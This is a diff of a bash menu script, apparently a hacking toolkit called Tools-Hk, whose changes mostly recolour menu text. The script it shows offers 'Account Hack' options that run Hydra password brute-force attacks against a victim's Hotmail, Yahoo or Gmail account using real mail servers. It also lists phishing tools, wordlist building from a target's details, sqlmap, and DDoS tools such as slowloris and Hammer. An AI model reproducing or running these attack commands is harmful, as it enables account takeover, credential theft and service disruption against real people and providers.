-echo -e $red   "Account Hack"
+echo -e $green   "Account Hack"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Crunch wordlist"
-echo -e $green     '{ -2- } ===> ' $red " Hydra"
+echo -e $green     '{ -2- } ===> ' $green " Hydra"
 echo -e $green     '{ -3- } ===> ' $white " weeman"
-echo -e $green     '{ -4- } ===> ' $red " socialfish"
+echo -e $green     '{ -4- } ===> ' $green " socialfish"
 echo ""
 echo -e $green     "00- BACK"
 echo ""
@@ -3341,22 +3742,22 @@ clear
 figlet "Creat wordlist"
 echo ""
 echo -e $green "what is the username ? "
-echo -e $red
+echo -e $green
 read -p " insert : " phone
 echo -e $green "name list ex :pass.txt "
-echo -e $red
+echo -e $green
 read -p " insert : " namelist
 
 echo -e $green " sum little first  + second = ? example : mohammed773532224 = fisrt + second 8+9 = 17 "
-echo -e $red
+echo -e $green
 echo ""
 read -p " insert : " much
 echo -e $green "please insert path save ex:/sdcard/"
-echo -e $red
+echo -e $green
 read -p " insert : " pathsave
 echo ""
 echo -e $green "insert your pass hack ex:first@@@@@"
-echo -e $red
+echo -e $green
 read -p " insert : " num
 echo ""
 toilet "Loading"
@@ -3368,11 +3769,11 @@ if [ $accountHk = 2 ]
 then
 clear
 head
-echo -e $red   "Hydra"
+echo -e $green   "Hydra"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Hotmail"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Yahoo"
+echo -e $green     '{ -2- } ===> ' $green " Yahoo"
 echo ""
 echo -e $green     '{ -3- } ===> ' $white " Gmail"
 echo ""
@@ -3385,10 +3786,10 @@ then
 clear
 figlet "Hotmail Hack"
 echo -e $yellow "please insert vactime email .."
-echo -e $red
+echo -e $green
 read -p " insert : " hayd
 echo -e $yellow "please insert path wordlist .."
-echo -e $red
+echo -e $green
 read -p " insert : " pass
 hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.live.com smtp
 fi
@@ -3397,10 +3798,10 @@ then
 clear
 figlet "Yahoo Hack"
 echo -e $yellow "please insert vactime email .."
-echo -e $red
+echo -e $green
 read -p " insert : " hayd
 echo -e $yellow "please insert path wordlist ..."
-echo -e $red
+echo -e $green
 read -p " insert : " pass
 hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.mail.yahoo smtp
 bash Tools-Hk.sh
@@ -3410,10 +3811,10 @@ then
 clear
 figlet "Gmail Hack"
 echo -e $yellow "please insert vactime email .."
-echo -e $red
+echo -e $green
 read -p " insert : " hayd
 echo -e $yellow "please insert path wordlist..."
-echo -e $red
+echo -e $green
 read -p " insert : " pass
 hydra -S -l $hayd -P $pass -v -V -e ns -s 465 smtp.gmail.com smtp
 bash Tools-Hk.sh
@@ -3474,19 +3875,19 @@ if [ $usage = 5 ]
 then
 clear
 head
-echo -e $red   "web hack"
+echo -e $green   "web hack"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Sqlmap"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Scriptux(creat index)"
+echo -e $green     '{ -2- } ===> ' $green " Scriptux(creat index)"
 echo ""
 echo -e $green     '{ -3- } ===> ' $white " sniper-h(list hash)"
 echo ""
-echo -e $green     '{ -4- } ===> ' $red " Hash Mix"
+echo -e $green     '{ -4- } ===> ' $green " Hash Mix"
 echo ""
 echo -e $green     '{ -5- } ===> ' $white " hash-identifier"
 echo ""
-echo -e $green     '{ -6- } ===> ' $red " dirsearch"
+echo -e $green     '{ -6- } ===> ' $green " dirsearch"
 echo ""
 echo -e $green     "00- BACK"
 echo ""
@@ -3597,11 +3998,11 @@ if [ $usage = 6 ]
 then
 clear
 head
-echo -e $red      " DDos Attack"
+echo -e $green      " DDos Attack"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " slowloris"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Hammer"
+echo -e $green     '{ -2- } ===> ' $green " Hammer"
 echo ""
 echo ""
 echo -e $green     "00- BACK"
@@ -3645,7 +4046,7 @@ if [ $usage = 7 ]
 then
 clear
 head
-echo -e $red   "Scan port"
+echo -e $green   "Scan port"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " nmap"
 echo ""
@@ -3660,7 +4061,7 @@ clear
 figlet "scan nmap"
 echo ""
 echo -e $green "What is Ip  web/device "
-echo -e $red
+echo -e $green
 read -p " insert : " ip
 echo ""
 toilet "Loading" 
@@ -3687,7 +4088,7 @@ if [ $usage = 8 ]
 then
 clear
 head
-echo -e $red   "cread -p " insert : " word list"
+echo -e $green   "cread -p " insert : " word list"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " creat (list password)"
 echo ""
@@ -3750,11 +4151,11 @@ if [ $name = 4 ]
 then
 clear
 head
-echo -e $red   "TOOLS"
+echo -e $green   "TOOLS"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " fix err kali linux"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " fix err Termux & Gnuroot"
+echo -e $green '{ -2- } ===> ' $green " fix err Termux & Gnuroot"
 echo ""
 echo ""
 echo -e $green "00- back"
@@ -3764,43 +4165,43 @@ if [ $repairing = 1 ]
 then
 clear
 head
-echo -e $red   "fix errors Kali Linux"
+echo -e $green   "fix errors Kali Linux"
 echo ""
 echo ""
 echo ""
 echo -e $green   '{ -1- } ===> ' $white " Fix error apt (not install && not update)"
 echo ""
-echo -e $green   '{ -2- } ===> ' $red " Fix error pgp"
+echo -e $green   '{ -2- } ===> ' $green " Fix error pgp"
 echo ""
 echo -e $green   '{ -3- } ===> ' $white " Fix error --fix-broken install"
 echo ""
-echo -e $green   '{ -4- } ===> ' $red " Fix error postgresql"
+echo -e $green   '{ -4- } ===> ' $green " Fix error postgresql"
 echo ""
 echo -e $green   '{ -5- } ===> ' $white " Fix error dpkg /var/lib/dpkg/lock"
 echo ""
-echo -e $green   '{ -6- } ===> ' $red " Fix error /var/lib/apt/archives/lock"
+echo -e $green   '{ -6- } ===> ' $green " Fix error /var/lib/apt/archives/lock"
 echo ""
 echo -e $green   '{ -7- } ===> ' $white " Fix error connection data metasploit"
 echo ""
-echo -e $green   '{ -8- } ===> ' $red " refresh .."
+echo -e $green   '{ -8- } ===> ' $green " refresh .."
 echo ""
 echo -e $green   "00- Back <==="
 echo "" 
 echo "" 
 echo -e $green "Enter The Number:" 
-echo -e $red
+echo -e $green
 read -p " insert : " fix_kali
 if [ $fix_kali = 1 ]
 then 
 clear
 echo ""
-echo -e $red "auto fix this err.."
+echo -e $green "auto fix this err.."
 echo -e $yellow '{ -1- } ===> ' $white " git clone http://github.com/profionaldhim/sources.list"
-echo -e $yellow '{ -2- } ===> ' $red " cd sources.list"
+echo -e $yellow '{ -2- } ===> ' $green " cd sources.list"
 echo -e $yellow '{ -3- } ===> ' $white " mv sources.list /"
-echo -e $yellow '{ -4- } ===> ' $red " mv sources.list /"
+echo -e $yellow '{ -4- } ===> ' $green " mv sources.list /"
 echo -e $yellow '{ -5- } ===> ' $white " cd .."
-echo -e $yellow '{ -6- } ===> ' $red " mv sources.list etc"
+echo -e $yellow '{ -6- } ===> ' $green " mv sources.list etc"
 echo ""
 echo ""
 echo ""
@@ -3828,9 +4229,9 @@ then
 clear
 echo ""
 echo "" 
-echo -e $red "to fix this err..."
+echo -e $green "to fix this err..."
 echo -e $yellow '{ -1- } ===> ' $white "past this command apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6 "
-echo -e $yellow '{ -2- } ===> ' $red " apt update && apt upgrade -y "
+echo -e $yellow '{ -2- } ===> ' $green " apt update && apt upgrade -y "
 echo ""
 echo ""
 echo -e $yellow "if you want auto fix this err please insert y then enter "
@@ -3876,7 +4277,7 @@ then
 clear
 echo ""
 echo "" 
-echo -e $red "if this err no postgresql after that look the solution ok .."
+echo -e $green "if this err no postgresql after that look the solution ok .."
 echo -e $yellow "if you want auto fix this err please insert y then enter "
 read -p " insert : " fix-postgresql
 if [ $fix-postgresql = "y" ]
@@ -3965,19 +4366,19 @@ if [ $repairing = 2 ]
 then
 clear
 head
-echo -e $red   "Repair Termux && Gnuroot"
+echo -e $green   "Repair Termux && Gnuroot"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " update && upgrade"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " repair source.list"
+echo -e $green     '{ -2- } ===> ' $green " repair source.list"
 echo ""
 echo -e $green     '{ -3- } ===> ' $white " install language programming"
 echo ""
-echo -e $green     '{ -4- } ===> ' $red " repair dpkg"
+echo -e $green     '{ -4- } ===> ' $green " repair dpkg"
 echo ""
 echo -e $green     '{ -5- } ===> ' $white " repair error metasploit to connect database"
 echo ""
-echo -e $green     '{ -6- } ===> ' $red " repair Tmux-Bunch-arm"
+echo -e $green     '{ -6- } ===> ' $green " repair Tmux-Bunch-arm"
 echo ""
 echo ""
 
@@ -4016,23 +4417,23 @@ if [ $repair = 3 ]
 then
 clear
 head
-echo -e $red   "install L.Programming"
+echo -e $green   "install L.Programming"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " install python"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " install python2"
+echo -e $green     '{ -2- } ===> ' $green " install python2"
 echo ""
 echo -e $green     '{ -3- } ===> ' $white " install python3"
 echo ""
-echo -e $green     '{ -4- } ===> ' $red " install python-pip & python2-pip"
+echo -e $green     '{ -4- } ===> ' $green " install python-pip & python2-pip"
 echo ""
 echo -e $green     '{ -5- } ===> ' $white " install ruby"
 echo ""
-echo -e $green     '{ -6- } ===> ' $red " install Php"
+echo -e $green     '{ -6- } ===> ' $green " install Php"
 echo ""
 echo -e $green     '{ -7- } ===> ' $white " install java"
 echo ""
-echo -e $green     '{ -8- } ===> ' $red " install perl"
+echo -e $green     '{ -8- } ===> ' $green " install perl"
 echo ""
 echo ""
 
@@ -4186,11 +4587,11 @@ if [ $name = 5 ]
 then
 clear
 head
-echo -e $red   "Encrypt / Decrypt The Tools"
+echo -e $green   "Encrypt / Decrypt The Tools"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Start Encrypt Your Tools"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Decrypt Your Tools"
+echo -e $green     '{ -2- } ===> ' $green " Decrypt Your Tools"
 echo ""
 echo ""
 echo -e $green     "00- BACK"
@@ -4200,7 +4601,7 @@ if [ $encrypt = 1 ]
 then
 clear
 head
-echo -e $red   "Start Encrypt The Tools"
+echo -e $green   "Start Encrypt The Tools"
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 echo ""
@@ -4224,7 +4625,7 @@ if [ $encrypt = 2 ]
 then
 clear
 head
-echo -e $red   "Start Encrypt The Tools"
+echo -e $green   "Start Encrypt The Tools"
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 echo ""
@@ -4254,7 +4655,7 @@ if [ $name = 6 ]
 then
 clear
 head
-echo -e $red   "      Update Tools-Hk "
+echo -e $green   "      Update Tools-Hk "
 echo ""
 rm -rif Tools-Hk.sh
 hash -r && wget https://raw.githubusercontent.com/profionaldhim/Tools-Hk/master/Tools-Hk.sh
